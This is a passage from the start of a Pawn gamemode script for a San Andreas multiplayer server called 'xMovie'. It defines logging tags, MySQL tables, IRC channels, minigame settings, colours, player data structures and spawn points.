// print("\7"); = pc beep for debuging purposes

/*    			PRINTLOG LEGEND 				*/
/*	INITIALIZE	=	Server startup          	*/
/*	TERMINATE	=	Server termination      	*/
/*	MYSQL		=	MySQL trigger           	*/
/*	MYSQL-E		=	MySQL error             	*/
/*	REGISTER	=	Player registration     	*/
/*	ADD-VIP		=	VIP promotion           	*/
/*	DEL-VIP		=	VIP removal             	*/
/*	ADD-ADMIN	=	Admin promotion         	*/
/*	DEL-ADMIN	=	Admin removal           	*/
/*	LVL-ADMIN	=	Admin level change      	*/
/*	SETPASS		=	Player password change  	*/
/*	JOIN		=	Player connection       	*/
/*	PART		=	Player disconnection    	*/
/*	LOGOUT-C	=	Logout ghost/clone account	*/
/*	CHAT		=	Public chat                 */
/*	CHAT-M		=	Muted chat                 	*/
/*	CHAT-G		=	Group chat         	       	*/
/*	CHAT-V		=	vIP chat             	     */
/*	CHAT-A		=	Admin chat          	    */
/*	CHAT-A5		=	Admin5 chat                 */
/*	CHAT-C		=	Coloured chat               */
/*	CHAT-W		=	World chat                  */
/*	CHAT-L		=	Local shit                  */
/*	KICK-A		=	Automatic kick              */
/*	LOGIN-A		=	Automatic login             */
/*	LOGIN-F		=	Login failure               */
/*	ADM-MSG		=	Admin message               */
/*	IRC			=	IRC message                 */
/*	IRC-J		=	IRC user join               */
/* 	IRC-L		=	IRC user quit               */
/*  IRCON       =   IRC rcon trigger            */
/*	KILL		=	Player death                */
/*	CMD			=	Player command              */
/*	CMD-F		=	Filterscript command        */
/*	CMD-VA		=	VIP/Admin command           */
/*	CMD-VA		=	IRC command                 */
/*	REPORT		=	Player report               */
/*	RADIO		=	Radio stream                */
/*	RADIO-C		=	Radio custom stream         */
/*	RADIO-V		=	Radio volume change         */
/*	RADIO2		=	Radio stream xAudio         */
/*	RADIO2-C	=	Radio custom stream         */
/*	RADIO2-V	=	Radio volume change         */
/*	STRIKE		=	Player strike               */
/*	SPAM-K		=	Automatic spam kick         */
/*	SPAM-M		=	Automatic spam mute         */
/*	SPAM-UM		=	Automatic spam unmute       */
/*  SPAM-MI     =   Automatic fake death mute	*/
/*	MAP-L		=	Map loaded                  */
/*	MAP-UL		=	Map unloaded                */
/*	MAP-CL		=	Map cleared                 */



#include <a_samp>
#include <core>
#include <streamer>
#include <djson>
#include <irc>
#include <sscanf2>
#include <a_mysql>
//#include <YSF>
#include <audio>
#include <GeoIP>
#include <a_zones>
#include <dns>
native WP_Hash(buffer[], len, const str[]);

#define MODE_NAME "x&Movie ©®"

#define DEFAULT_MOTD "xMovie, where all your naughty dreams can come true."
new servermessage[128] = DEFAULT_MOTD,
	serverrules[450] = "You can change and save a skin with /s(kin) <skinID> or /ssel (hold tab to exit)\n\n\
					Rules:\n\
					* Instant ban: hacking and/or cheating\n\
					* Bans: 3rd kick or disrespect against authorities\n\
					* Kicks: 2nd warning, heavy DMing, spam or disrespect\n\
					* Others: disrespect, DMing, spam of any kind\n\
					* CLEO mods: no flying look-like mods allowed\n\
					* Creating useless random crap to annoy players = ban\n\
					* Exeptions: interactive mods are allowed (no abuse)";

#define DERBYFILE           "derby.data"

#undef MAX_PLAYERS
#define MAX_PLAYERS 50
#define MAX_RESERVED_SLOTS 3

// MYSQL START
new mysqlConnection,
	bool:mysqloffline = false;

//#define MYSQL_IP              "game.host.net"
#define MYSQL_IP                "localhost"
#define MYSQL_USER				"root"
#define MYSQL_PASSWORD			""
#define MYSQL_DB				"x-movie"

#define MYSQL_TABLE_ACCOUNTS			"accounts"
#define MYSQL_TABLE_PLAYER_LOGS			"player_logs"
#define MYSQL_TABLE_PREFERENCES 		"preferences"
#define MYSQL_TABLE_BANS				"bans"
#define MYSQL_TABLE_TELEPORTS			"teleports"
#define MYSQL_TABLE_IPS         		"ips"
#define MYSQL_TABLE_ADVERTS     		"adverts"
#define MYSQL_TABLE_MEMOS       		"memos"
#define MYSQL_TABLE_OSTICKS     		"osticks"
#define MYSQL_TABLE_POSTICKS    		"posticks
#define	MYSQL_TABLE_HOSTBANS			"hostbans"
#define	MYSQL_TABLE_SERVER_LOGS			"server_logs"
#define	MYSQL_TABLE_SERVER_STATISTICS	"server_statistics"
#define	MYSQL_TABLE_WARZONE_SETTINGS	"warzone_settings"
#define	MYSQL_TABLE_WARZONE_BASES		"warzone_bases"
#define	MYSQL_TABLE_WARZONE_VEHICLES	"warzone_vehicles"

#define checkcinc(); if (!IsPlayerConnected(playerid)) return 0; if (player[playerid][cinc] != ccinc) { format(logstring, sizeof(logstring), "Query result collision for playerID %d (Got: %d, should be: %d)", playerid, ccinc, player[playerid][cinc]); printflog("MYSQL-E", logstring); return 0; }
#define mysql_run_query if (gmxinprogress == false) querybalance++; mysql_function_query
#define KickEx(%0) SetTimerEx("KickPlayer", 500, 0, "d", %0)
//#define mysql_run_query printflog("DEBUG", "Query called"); querybalance++; mysql_function_query
// Tags for custom query callbacks: QS_ = QuerySelect

new querybalance;
// MYSQL END

#define IRC_CHANNEL		"#mr_pepino_irc"
#define IRCHOP_CHANNEL	"%#mr_pepino_irc"
#define IRCOP_CHANNEL	"@#mr_pepino_irc"
#define IRCSOP_CHANNEL	"&#mr_pepino_irc"
#define IRCQOP_CHANNEL	"~#mr_pepino_irc"

/*** NORMAL & PREMIUM DEFINES ***/
#define DEFAULT_MAX_WORLDS  	500
#define VIP_MAX_WORLDS			1000000000

#define DEFAULT_MAX_OSTICKS   	5
#define VIP_MAX_OSTICKS         10

#define DEFAULT_MAX_POSTICKS    5
#define VIP_MAX_POSTICKS        MAX_PLAYER_ATTACHED_OBJECTS //	(10)

#define DEFAULT_MAX_SPEED       1
#define VIP_MAX_SPEED           5
#define ADMIN_MAX_SPEED         100

#define DEFAULT_MAX_SCALE       3
#define VIP_MAX_SCALE           100
// /setveh = 7 parameters (3 basic + 4 VIP)
/********************************/

#define MAX_ADMIN_LEVEL		6
#define MAX_LOGIN_ATTEMPTS  3
#define MAX_GROUPS			50
#define MAX_SPAWNS			3
#define MAX_TELES			100
#define MAX_DERBIES			100
#define MAX_FAILED_TICKS    3 // when ticks reached -> paused or timed out

#define WORLDID_DEFAULT		0
#define WORLDID_ASSIGNSPAWN VIP_MAX_WORLDS+1
// MINIGAMES START //
#define WORLDID_DM			VIP_MAX_WORLDS+2
#define WORLDID_DERBY		VIP_MAX_WORLDS+3
#define WORLDID_COPCHASE	VIP_MAX_WORLDS+4
#define WORLDID_NADEBALL	VIP_MAX_WORLDS+5
#define WORLDID_WARZONE		VIP_MAX_WORLDS+6

#define TEAM_COPS       	MAX_PLAYERS+1
#define TEAM_CRIMINAL   	MAX_PLAYERS+2
#define TEAM_NADEBALL   	MAX_PLAYERS+3 // 1 general team to prevent (team) killing
#define TEAM_ATTACKERS   	MAX_PLAYERS+4
#define TEAM_DEFENDERS   	MAX_PLAYERS+5
/* - */

#define MIN_DERBY_PLAYERS       2
#define MAX_DERBY_PLAYERS		10
#define DEFAULT_DERBY_VEHICLE	556

#define MIN_RR_PLAYERS          2
#define MAX_RR_PLAYERS			6

#define MIN_COPCHASE_PLAYERS    3
#define MAX_COPCHASE_PLAYERS	15
#define GROUP_COPCHASE          MAX_GROUPS-1

#define MIN_NADEBALL_PLAYERS    2
#define MAX_NADEBALL_PLAYERS	10
#define DEFAULT_NADEBALL_GAMES	5

#define MIN_WARZONE_PLAYERS     2
#define MAX_WARZONE_PLAYERS     30
#define GROUP_ATTACKERS			MAX_GROUPS-2
#define GROUP_DEFENDERS			MAX_GROUPS-3
// MINIGAMES END //

#define DIALOGID_UNKNOWN			1337 // not needed dialogids
#define DIALOGID_SPAWN				1
#define DIALOGID_ACTION				2
#define DIALOGID_SENDPM				3
#define DIALOGID_KICK				4
#define DIALOGID_BAN				5
#define DIALOGID_REGISTER           6
#define DIALOGID_SETPASS   			7
#define DIALOGID_SETMAIL            8
#define DIALOGID_LOGIN       		9
#define DIALOGID_DERBYLIST          10
#define DIALOGID_WARZONELIST		11
#define DIALOGID_RADIO              12
#define DIALOGID_RADIOLIST			13
#define DIALOGID_RADIOCUSTOM		14
#define DIALOGID_RETURNBUTTON		15
#define DIALOGID_RADIO2             16
#define DIALOGID_RADIO2LIST			17
#define DIALOGID_RADIO2CUSTOM		18
#define DIALOGID_RADIO2VOLUME		19
#define DIALOGID_RETURNBUTTON2  	20
#define DIALOGID_RADIOSTOP   		21
#define DIALOGID_OSTICKS        	22
#define DIALOGID_POSTICKS           23
#define	DIALOGID_TELEPORTS          24
#define	DIALOGID_KEYBINDS			25
#define	DIALOGID_SETMSBIND   		26
#define	DIALOGID_COLOUR				27
#define	DIALOGID_PCOLOUR			28
#define DIALOGID_FORCECOLOUR        29
#define DIALOGID_RUNNINGSTYLE    	30
#define DIALOGID_WALKINGSTYLE		31

#define MAKE_COLOUR(%0,%1,%2) ((((%0) & 0xFF) << 16) | (((%1) & 0xFF) << 8) | (((%2) & 0xFF) << 0))
#define MAKE_COLOUR_AA(%0,%1,%2) ((((%0) & 0xFF) << 24) | (((%1) & 0xFF) << 16) | (((%2) & 0xFF) << 8) | 0xAA)
#define MAKE_COLOUR_ALPHA(%0,%1,%2,%3) ((((%0) & 0xFF) << 24) | (((%1) & 0xFF) << 16) | (((%2) & 0xFF) << 8) | (((%3) & 0xFF) << 0))

#define COLOUR_RED         MAKE_COLOUR(255, 0, 0)
#define COLOUR_GREEN       MAKE_COLOUR(0, 255, 0)
#define COLOUR_BLUE        MAKE_COLOUR(0, 0, 255)

#define COLOUR_CYAN_AA     MAKE_COLOUR_AA(0, 255, 255)
#define COLOUR_MAGENTA_AA  MAKE_COLOUR_AA(255, 0, 255)
#define COLOUR_YELLOW_AA   MAKE_COLOUR_AA(255, 255, 0)

#define BLACK_ALPHA        MAKE_COLOUR_ALPHA(0, 0, 0, 170) // 170 == 0xAA
#define WHITE_ALPHA        MAKE_COLOUR_ALPHA(255, 255, 255, 255)

#define INVISIBLE_BLACK    (0)

#define COLOR_INVISIBLE     0xFFFFFF00
#define COLOR_WHITE			0xFFFFFFAA
#define COLOR_GREEN			0x33AA33AA
#define COLOR_RED			0xFF0000FF
#define COLOR_BLUE 			0x0000FFFF
#define COLOR_PINK			0xFF69B4FF
#define COLOR_PURPLE 		0x9900FFAA
#define COLOR_YELLOW		0xFFFF00AA
#define COLOR_BROWN 		0xA52A2AAA
#define COLOR_GREY			0xAFAFAFAA
#define COLOR_BLACK			0x000000AA
#define COLOR_LPINK			0xF64BC2AA
#define COLOR_ORANGE		0xFF8000FF
#define COLOR_PINKRED       0xFF0040AA
#define COLOR_DARKRED		0xDC143CAA	// crimson
#define COLOR_DARKERRED		0x660000AA
#define COLOR_ORANGERED 	0xFF4500AA
#define COLOR_TOMATO 		0xFF6347AA
#define COLOR_LIGHTBLUE		0x33CCFFAA
#define COLOR_LIGHTNAVY		0x8FFDFFAA
#define	COLOR_NAVYBLUE		0x3366FFAA
#define COLOR_LBLUE			0x00FFFFAA
#define COLOR_LLBLUE		0x0080FFFF
#define COLOR_FLBLUE		0x6495EDAA
#define COLOR_BLUEVIOLET 	0x8A2BE2FF	// dark purple
#define COLOR_BISQUE		0xFFE4C4AA
#define COLOR_LIME			0x10F441AA
#define COLOR_LAWNGREEN 	0x7CFC00AA
#define COLOR_SEAGREEN 		0x20B2AAAA
#define COLOR_LIMEGREEN 	0x32CD32AA	//<--- Dark lime
#define COLOR_SPRINGGREEN 	0x00FF7FAA
#define COLOR_YELLOWGREEN 	0x9ACD32AA	//- like military green
#define COLOR_GREENYELLOW 	0xADFF2FAA
#define COLOR_OLIVE 		0x808000AA
#define COLOR_AQUA			0xF0F8FFAA
#define COLOR_MEDIUMAQUA 	0x83BFBFAA
#define COLOR_MAGENTA		0xFF00FFFF
#define COLOR_MEDIUMMAGENTA	0x8B008BAA	// dark magenta
#define COLOR_CHARTREUSE	0x7FFF00AA
#define COLOR_CORAL 		0xFF7F50AA
#define COLOR_GOLD 			0xB8860BAA
#define COLOR_INDIGO 		0x4B00B0AA
#define COLOR_IVORY 		0xFFFF82AA

#define EMBED_WHITE			"{FFFFFF}"
#define EMBED_GREEN			"{33AA33}"
#define EMBED_RED			"{FF0000}"
#define EMBED_BLUE 			"{0000FF}"
#define EMBED_PINK			"{FF69B4}"
#define EMBED_PURPLE 		"{9900FF}"
#define EMBED_YELLOW		"{FFFF00}"
#define EMBED_BROWN 		"{A52A2A}"
#define EMBED_GREY			"{AFAFAF}"
#define EMBED_BLACK			"{000000}"
#define EMBED_LPINK			"{F64BC2}"
#define EMBED_ORANGE		"{FF8000}"
#define EMBED_PINKRED       "{FF0040}"
#define EMBED_DARKRED		"{DC143C}"	// crimson
#define EMBED_DARKERRED		"{660000}"
#define EMBED_ORANGERED 	"{FF4500}"
#define EMBED_TOMATO 		"{FF6347}"
#define EMBED_LIGHTBLUE		"{33CCFF}"
#define EMBED_LIGHTNAVY		"{8FFDFF}"
#define	EMBED_NAVYBLUE		"{3366FF}"
#define EMBED_LBLUE			"{00FFFF}"
#define EMBED_LLBLUE		"{0080FF}"
#define EMBED_FLBLUE		"{6495ED}"
#define EMBED_BLUEVIOLET 	"{8A2BE2}"	// dark purple
#define EMBED_BISQUE		"{FFE4C4}"
#define EMBED_LIME			"{10F441}"
#define EMBED_LAWNGREEN 	"{7CFC00}"
#define EMBED_SEAGREEN 		"{20B2AA}"
#define EMBED_LIMEGREEN 	"{32CD32}"	//<--- Dark lime
#define EMBED_SPRINGGREEN 	"{00FF7F}"
#define EMBED_YELLOWGREEN 	"{9ACD32}"	//- like military green
#define EMBED_GREENYELLOW 	"{ADFF2F}"
#define EMBED_OLIVE 		"{808000}"
#define EMBED_AQUA			"{F0F8FF}"
#define EMBED_MEDIUMAQUA 	"{83BFBF}"
#define EMBED_MAGENTA		"{FF00FF}"
#define EMBED_MEDIUMMAGENTA	"{8B008B}"	// dark magenta
#define EMBED_CHARTREUSE	"{7FFF00}"
#define EMBED_CORAL 		"{FF7F50}"
#define EMBED_GOLD 			"{B8860B}"
#define EMBED_INDIGO 		"{4B00B0}"
#define EMBED_IVORY 		"{FFFF82}"

#define GAMEMODE_VEHICLES 67 // initial+1

#define SPAM_MAX_MSGS 6
#define SPAM_TIMELIMIT 7 // 7 SECONDS

#define TD_MODE_INTRO	0
#define TD_MODE_PLAY1   1
#define TD_MODE_PLAY2   2
#define TD_MODE_PLAY3   3
#define TD_MODE_PLAY4   4
#define TD_MODE_PLAY5   5
#define TD_MODE_PLAY6   6
#define TD_MODE_VEHI1   7
#define TD_MODE_VEHI2   8
#define	TD_MODE_VEHI3   9
#define TD_MODE_TELE1   10
#define TD_MODE_TELE2   11
#define TD_MODE_OBJE1   12
#define TD_MODE_OBJE2   13
#define TD_MODE_OBJE3   14
#define TD_MODE_MISC1   15
#define TD_MODE_MISC2   16
#define TD_MODE_MISC3   17
#define TD_MODE_MISC4   18
#define TD_MODE_PREM1   19
#define TD_MODE_PREM2   20
#define TD_MODE_PREM3   21
#define TD_MODE_PREM4   22
#define TD_MODE_PREM5   23
#define TD_MODE_PREM6   24
#define TD_MODE_ADMI1   25
#define TD_MODE_ADMI2   26
#define TD_MODE_ADMI3   27
#define TD_MODE_ADMI4   28
#define TD_MODE_ADMI5   29
#define TD_MODE_ADMI6   30
#define TD_MODE_ADMI7   31
#define TD_MODE_ADMI8   32
#define TD_MODE_ADMI9   33
#define TD_MODE_ADMI10  34
#define TD_MODE_ADMI11  35
#define TD_MODE_ADMI12  36
#define TD_MODE_ADMI13  37
#define TD_MODE_GETINFO 38

forward Routine1();
forward Routine2();
forward Routine3();
forward ReservedSlotKick(playerid);
forward IsPlayerPassenger(playerid);
forward IsPlayerDriver(playerid);
forward Advert();
//forward HideInfoShowStats(playerid);
forward DeleteObject(objectid);
forward DeletePlayerObject(playerid, objectid);
forward AutoFlip(playerid);
forward CarUnlockTimer();
forward AllClearWarning1();
forward AllClearWarning2();
forward AllClear();
forward PutPlayerBack(playerid, vehicleid, seatid);
forward SpamUnmute(playerid);
forward CreateExplosionEx(Float:X, Float:Y, Float:Z, type, Float:Radius);
forward SetPlayerPosEx(playerid, Float:X, Float:Y, Float:Z, Float:Angle, Interior);
//forward EnableSpray();
forward SpawnPlayerEx1(playerid);
forward SpawnPlayerEx2(playerid);
forward DestroyVehicleEx(vehicleid);
forward ObjectsLoading(playerid);
forward ObjectsLoaded(playerid);
forward Lightning(playerid);
forward GetPlayerAccountID(playerid);
forward IsPlayerRegistered(playerid);
forward IsPlayerLoggedIn(playerid);
forward GetPlayerCinc(playerid); // mysql usage
forward IsVIP(playerid);
forward IsAdmin(playerid);
forward GetPlayerAdminLevel(playerid);
forward IsPlayerSpawned(playerid);
forward IsPlayerMuted(playerid);
forward IsPlayerBlocked(playerid);
forward IsPlayerInDMSPJA(playerid);
forward CountDown();
forward CrewCountDown(crewid);
forward SendMessageToVIPs(color, str[]);
forward SendMessageToAdmins(color, str[], admlevel);
forward SetRRPhase(phase);
forward AnnounceMessage();
forward FadeIntro(playerid);
forward RemoveCCPlayerEx(playerid);
forward earthquake();
forward earthquake2();
forward ReloadStickedObjects(playerid);
forward SetCriminalInvisible();

new Menu:ActionMenu, // general menu
	Menu:SkateMenu,
	Menu:SwimMenu,
	Menu:DanceMenu1,
	Menu:DanceMenu2,
	Menu:StripMenu1,
	Menu:StripMenu2,
	Menu:FuckyouMenu,
	Menu:HandsupMenu,
	Menu:SmokeMenu,
	Menu:WeirdMenu,
	Menu:TuningMenu,	// Tuning menu
	Menu:SCMenu,		// Tuning menu - Single Color
	Menu:TC1Menu,		// Tuning menu - Two Colors 1
	Menu:TC2Menu,		// Tuning menu - Two Colors 2
	Menu:NMenu,			// Tuning menu - Nitro
	Menu:WMenu,			// Tuning menu - Wheels
	Menu:W2Menu,    	// Tuning menu - Wheels 2
	Menu:PMenu;			// Tuning menu - Paintjobs

new bool:servergodmode 			= true,
    bool:tags 					= true,
    bool:gotos 					= true,
    bool:autovehiclecolor	 	= false,
    bool:autoplayercolor 		= false,
    bool:colouredchat 			= false,
    bool:acolour 				= true,
	//bool:payandsprayinuse 	= false,
	bool:andromadacheckpoint	= false,
	bool:mutedchat 				= false,
	bool:skipaclear 			= false,
	bool:drunken 				= true,
	bool:screen 				= false,
	bool:screen2 				= false,
	bool:votesys 				= false,
	bool:derbystarted 			= false,
	bool:blockevents 			= false,
	bool:dmlocked	 			= false,
	bool:derbylocked 			= false,
	bool:rrlocked	 			= false,
	bool:cclocked	 			= false,
	bool:nbblocked	 			= false,
	bool:wzlocked	 			= true,
	bool:rrstarted 				= false,
	bool:ccstarted 				= false,
	bool:nbstarted 				= false,
	bool:warzonestarted 		= false,
	bool:gmxinprogress 			= false;

enum player_enum
{
	cinc,
	playtime,
	VIP,
	ADMIN,
	logged,
	accountid,
	clogged,
	hideadmin,
	adminmsgs,
	firstspawn,
	pspawnid,
	spawned,
    logintimeout,
    loginfail,
	godmode,
	vgodmode,
	vlights,
	vlightmode,
    warnings,
    lastwarned,
    ramps,
	antifall,
	antifallvid, // vehicleid
	antifallsid, // seatid
	pcolour,
    Spectating,
    SpectatingOn,
    SpectatingInfo,
	InShamal,
	InAndromada,
	suicide,
	playingdm,
	playingderby,
	playingrr,
	playingcc,
	playerccmode,
	playingnb,
	playernbteam,
	playernbmode,
	playingwarzone,
	playerwarzoneteam,
	playerwarzonemode,
	playerwarzoneset,
	eventinvite,
	specdm,
	running,
	runningon,
	walking,
	walkingon,
	skating,
	swimming,
	tunecam,
	frozen,
	jailed,
	muted,
	blocked,
	strew,
	strewid,
	apc,
	acc,
	vehiclecolor1,
	savedvehicle,
	vehiclebind,
	Float:savedms,
	gotomode,
	interior,
	virtualworld,
	ostickc,
	postickc,
	chat,
	moviecrew,
	crewinvite,
	delay,
	spamprotection,
	spamcount,
	spamcounttokick,
	afk,
	INTROtextdraw,
	FadeTimer,
	FadeStep,
	FadeStepOn,
	RULEStextdraw,
	DONATEtextdraw,
	FPStextdraw,
	DrunkLevelLast,
	FPS,
	PMSGtextdraw,
	voted,
	clickedplayer,
	disablepm,
	lastpm,
	showicons,
	socreated,
	aftimer,
	Float:strewdist,
	AFKtickcount,
	radio,
	HANDLEID_GLOBAL,
	HANDLEID_RADIO,
	Text3D:personaltext
}
static player[MAX_PLAYERS][player_enum];

enum sticked_object_data
{
	so_object, // object id [NOT NEEDED FOR MYSQL, IS DYNAMIC VALUE]
	so_model, // model id
	so_isvehicle, // [NOT NEEDED FOR MYSQL, IS DYNAMIC VALUE]
	so_vehiclemodel,
	Float:so_x,
	Float:so_y,
	Float:so_z,
	Float:so_rx,
	Float:so_ry,
	Float:so_rz
}
new pSObject[MAX_PLAYERS][VIP_MAX_OSTICKS][sticked_object_data];

enum attached_object_data
{
	ao_model,
	ao_bone,
	Float:ao_x,
	Float:ao_y,
	Float:ao_z,
	Float:ao_rx,
	Float:ao_ry,
	Float:ao_rz,
	Float:ao_sx,
	Float:ao_sy,
	Float:ao_sz
}
new pAObject[MAX_PLAYERS][VIP_MAX_POSTICKS][attached_object_data];

new AFKreason[MAX_PLAYERS][15];

#define MAX_SCREEN_OBJECTS 98
new soplayer[MAX_PLAYERS][MAX_SCREEN_OBJECTS]; // objects at class selection;

new crewowner[MAX_GROUPS],
	crews[MAX_GROUPS],
	crewscene[MAX_GROUPS],
	crewshot[MAX_GROUPS];

enum vehicle_enum
{
	Owner,
	Objective,
	Locked,
}
static vehicle[MAX_VEHICLES][vehicle_enum];

const object_undamaged = 0;
const door_swinging = 1;
const door_damaged = 2;
const door_damaged_swinging = 3;
const door_fell_off = 4;

const windshield_crackedA = 1;
const windshield_crackedB = 2;
const windshielddestroyed = 3;

new DerbyID 					= 0,
	DerbyVehicleID 				= DEFAULT_DERBY_VEHICLE,
	DerbyMaxPlayers 			= -1,
	DerbyMode 					= 0,
	Float:DerbyMinimumHeight 	= 0.0,
	Float:DerbyCenterX 			= 0.0,
	Float:DerbyCenterY 			= 0.0,
	Float:DerbyCenterZ 			= 0.0,
	DerbyRelatedMap[30] 		= "nonexmovie",
	derbyplayers 				= 0,
	derbysecondsleft 			= -5;

new rrplayers 				= 0,
	rrsecondsleft 			= -5,
	rrsecondslefttillnext 	= 30,
	currentrruser 			= -1,
	currentrrbullet 		= -1,
	bool:isgunspun 			= false,
	bool:isgunspundone 		= false;

new ccplayers 						= 0,
	ccsecondsleft 					= -5,
	ccsecondslefttillend 			= 600, // 10 mins
	ccsecondslefttillstatusupdate 	= 10,
	ccsecondslefttilllocationupdate	= 120, // 2 mins
	currentcccriminal 				= -1,
	currentccvehicle 				= -1,
	ccplayerlist[MAX_COPCHASE_PLAYERS] = { -1, ... };

new nbplayers 		= 0,
	nbsecondsleft 	= -5,
	nbgames		 	= 0,
	nbteam1wins 	= 0,
	nbteam2wins 	= 0,
	nbfield 		= 0,
	nbfieldteam1,
	nbfieldteam2,
	nbteam1players 	= 0,
	nbteam2players 	= 0,
	nbplayerlist[MAX_NADEBALL_PLAYERS] = { -1, ... },
	nbteam1colour,
	nbteam2colour;

new warzoneplayers				= 0,
    warzonesecondsleft  		= -2,
    warzonesecondslefttillcap   = 31,
    warzoneminuteslefttillend   = 10, // 10 min
    warzonesecondslefttillend   = 0,
    warzonebase                 = 0,
    warzonemode                 = 0,
    Float:warzonecpx            = 0.00,
    Float:warzonecpy            = 0.00,
    Float:warzonecpz            = 0.00,
    warzonegangzone             = -1,
    warzonecheckpoint_base      = -1,
    warzonecheckpoint_airborne  = -1,
    warzoneattackers    		= 0,
    warzonedefenders    		= 0,
    warzoneattackersleft    	= 0,
    warzonedefendersleft    	= 0,
    warzoneskinattackers        = 62,
	warzoneskindefenders        = 171,
	/*warzoneattackersset2limit	= 0,
	warzonedefendersset2limit	= 0,*/
	warzonecolourattackers      = COLOR_RED,
	warzonecolourdefenders      = COLOR_BLUE,
	warzoneplayerlist[MAX_WARZONE_PLAYERS] = { -1, ... };


new giveplayername[24],
	playername[24],
	strings[135], // little things
	ircstring[150], // strings -to> ircstrings
	infostr[265],
	tmps1[255], // normal user cmds/stuff
	tmps2[255], // vip/admin cmds/stuff
	stringo[10],
	stringe[128],
	derbystr[30],
	logstring[255],
	sMsg[595], // server message
	playerip[16],
 	lockedveh[4],
    rcbandit[18],
    rcgoblin[8],
    rcraider[8],
    rctiger[12],
    rccam[6],
    rcbaron[6],
	playerpoo[24],
	playerpill[24],
	announcestr[176];

new giveplayerid,
	stime,
	sweather,
	year,
	month,
	day,
	hour,
	minute,
	second,
	teleid,
 	Visitors = 0,
	andromadavehicleid = -1,
	spawnpickup1,
	spawnpickup2,
	spawnpickup3,
	spawnpickup4,
	spawnpickup5,
	poo = -1,
	pill = -1,
	andromadadoor,
	votesysleft = 30,
	spawnareaid,
	spawnareaid2,

	adminmsgtimer = -1,
	adminmsgcount,
	adminmsgend,

	earthquaketimer1 = -1,
	earthquaketimer2 = -1;

new Float:playerxyza[4],
	Float:playerxyzaiv[MAX_PLAYERS][MAX_SPAWNS][4]; // 3 = allowed spawns, 4 = X Y Z A

new /*Text:title = INVALID_TEXT_DRAW,
	//Text:info = INVALID_TEXT_DRAW,
	Text:rules = INVALID_TEXT_DRAW,
	Text:rules2 = INVALID_TEXT_DRAW,
	Text:credits = INVALID_TEXT_DRAW,*/
	//Text:introhalloween = INVALID_TEXT_DRAW,
	Text:intro1 				= Text:INVALID_TEXT_DRAW,
	Text:intro2[MAX_PLAYERS] 	= { Text:INVALID_TEXT_DRAW, ...},
	Text:screentd 				= Text:INVALID_TEXT_DRAW,
	Text:RRblood 				= Text:INVALID_TEXT_DRAW,
	Text:nrules 				= Text:INVALID_TEXT_DRAW,
	Text:donatetd1 				= Text:INVALID_TEXT_DRAW,
	Text:donatetd2 				= Text:INVALID_TEXT_DRAW,
	Text:adminmsg 				= Text:INVALID_TEXT_DRAW,
	Text:pinfo[MAX_PLAYERS] 	= { Text:INVALID_TEXT_DRAW, ...},
	Text:pmsg1[MAX_PLAYERS] 	= { Text:INVALID_TEXT_DRAW, ...},
	Text:pmsg2[MAX_PLAYERS] 	= { Text:INVALID_TEXT_DRAW, ...},
	Text:pmsg3[MAX_PLAYERS] 	= { Text:INVALID_TEXT_DRAW, ...},
	Text:pmsg4[MAX_PLAYERS] 	= { Text:INVALID_TEXT_DRAW, ...},
	Text:pmsg5[MAX_PLAYERS] 	= { Text:INVALID_TEXT_DRAW, ...},
	Text:derbyhelptd1 			= Text:INVALID_TEXT_DRAW,
	Text:derbyhelptd2 			= Text:INVALID_TEXT_DRAW,
	Text:rrhelptd1 				= Text:INVALID_TEXT_DRAW,
	Text:rrhelptd2 				= Text:INVALID_TEXT_DRAW,
	Text:ccstatus[MAX_PLAYERS] 	= { Text:INVALID_TEXT_DRAW, ...},
	Text:ccstatus2 				= Text:INVALID_TEXT_DRAW,
	Text:ccstatus3 				= Text:INVALID_TEXT_DRAW,
	Text:ccstatus4 				= Text:INVALID_TEXT_DRAW,
	Text:ccstatus5 				= Text:INVALID_TEXT_DRAW,
	Text:cchelptd1				= Text:INVALID_TEXT_DRAW,
	Text:cchelptd2				= Text:INVALID_TEXT_DRAW,
	Text:nbhelptd1				= Text:INVALID_TEXT_DRAW,
	Text:nbhelptd2				= Text:INVALID_TEXT_DRAW,
	Text:wzhelptd1				= Text:INVALID_TEXT_DRAW,
	Text:wzhelptd2				= Text:INVALID_TEXT_DRAW,
	Text:wzteamtd1				= Text:INVALID_TEXT_DRAW,
	Text:wzteamtd2				= Text:INVALID_TEXT_DRAW,
	Text:wzteamtd3				= Text:INVALID_TEXT_DRAW,
	Text:wzweaponsettd1			= Text:INVALID_TEXT_DRAW,
	Text:wzweaponsettd2			= Text:INVALID_TEXT_DRAW,
	Text:wzweaponsettd3			= Text:INVALID_TEXT_DRAW,
	Text:wzweaponsettd4			= Text:INVALID_TEXT_DRAW,
	Text:wzweaponsettd5			= Text:INVALID_TEXT_DRAW,
	Text:wzstatustd1			= Text:INVALID_TEXT_DRAW,
	Text:wzstatustd2			= Text:INVALID_TEXT_DRAW;

new Count = 5,
	CrewCount = 5;

new const CountText[5][15] ={
"~r~1",
"~y~2",
"~y~3",
"~b~4",
"~b~get ready"
};

new const CrewCountText[5][15] ={
"1",
"2",
"3",
"4",
"~w~get ready"
};

/*new const Float:MSpawnPos[9][4] = { // Initial MOVIE spawn positions.
{141.8798,1091.7821,13.6094,70.6260},
{135.5258,1070.8639,13.6094,103.0876},
{133.1890,1041.7542,13.6094,75.8901},
{121.5253,1038.6470,13.6154,354.7360},
{95.8491,1037.8707,13.6094,356.9294},
{86.0937,1050.7292,13.6094,272.2659},
{81.0258,1079.9735,13.6094,270.9498},
{97.9031,1098.2609,13.6094,244.6296},
{122.9606,1110.7670,13.6094,168.7396}
};*/

new const Float:MSpawnPos[4][4] = {
{-1008.0888,-911.9911,129.2188,178.3865},
{-1005.1199,-913.0186,129.2188,142.9795},
{-1004.1187,-918.1533,129.2188,92.8457},
{-1008.9514,-918.2911,129.2188,140.7862}
};

new const Float:M2SpawnPos[5][4] = {
{-1392.0933,-1518.8715,102.0052,324.7644},
{-1389.5067,-1520.7363,102.0012,325.2448},
{-1394.6637,-1516.9330,102.0008,320.9207},
{-1392.4877,-1516.7822,102.0063,324.7643},
{-1389.9209,-1518.6676,102.0008,322.8426}
};

new const Float:LSSpawns[5][4] = {
{1259.9998,-2015.7786,59.1519,179.4314},
{1274.0898,-2013.1627,58.7492,138.0948},
{1248.7939,-2013.6881,59.4721,219.9506},
{1273.1688,-2028.7241,58.7765,88.5701},
{1273.1315,-2040.9039,58.8087,90.3853}
};

new const Float:SFSpawns[4][4] = {
{-2641.1299,1339.0315,6.8860,318.5832},
{-2644.2515,1358.5966,6.8924,357.6737},
{-2641.6714,1375.2644,6.8817,229.2859},
